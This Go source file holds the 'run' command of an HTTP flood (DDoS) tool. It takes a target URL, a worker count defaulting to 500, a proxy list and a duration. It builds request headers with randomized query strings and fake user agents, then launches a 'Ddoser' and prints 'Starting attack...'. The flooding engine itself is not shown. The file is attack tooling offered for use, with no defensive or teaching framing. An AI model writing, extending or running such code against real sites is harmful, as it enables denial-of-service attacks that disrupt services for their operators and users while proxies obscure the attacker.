package main

import (
	"fmt"
	"net/url"
	"time"

	browser "github.com/EDDYCJY/fake-useragent"
	"github.com/symfony-cli/console"
	"github.com/symfony-cli/terminal"
	"github.com/valyala/fasthttp"
)

var runCommand = &console.Command{
	Name: "run",
	Flags: []console.Flag{
		&console.StringFlag{
			Name:     "url",
			Required: true,
		},
		&console.IntFlag{
			Name:         "worker",
			Aliases:      []string{"w"},
			DefaultValue: 500,
		},
		&console.StringFlag{
			Name:         "file",
			Aliases:      []string{"f"},
			DefaultValue: "http.txt",
		},
		&console.DurationFlag{
			Name:         "duration",
			Aliases:      []string{"d"},
			DefaultValue: time.Second * 10,
		},
	},
	Action: func(c *console.Context) error {
		u, err := url.ParseRequestURI(c.String("url"))

		if err != nil || u.Hostname() == "" || u.Port() == "" {
			return fmt.Errorf("invalid URL")
		}

		headers := make([]string, 100)
		proxies := readLines(c.String("file"))
		spinner := terminal.NewSpinner(c.App.Writer)

		terminal.Println("<fg=yellow>Prepare for headers</>")

		spinner.Start()
		var h fasthttp.RequestHeader
		h.SetMethod("GET")
		h.SetHost(u.Host)
		h.Set("Connection", "keep-alive")

		for i := range headers {
			h.SetRequestURI(u.RequestURI() + `?` + randomString(5) + `=` + randomString(32))
			h.SetUserAgent(browser.Random())
			headers[i] = h.String()
			time.Sleep(time.Millisecond * 10)
		}
		spinner.Stop()

		ddoser, err := NewDdoser(u, c.Int("worker"), headers, proxies)

		if err != nil {
			return err
		}

		terminal.Println("<fg=yellow>Starting attack...</>")

		ddoser.Run()

		time.Sleep(c.Duration("duration"))

		terminal.Println("<fg=green>Attack finished</>")

		return nil
	},
}
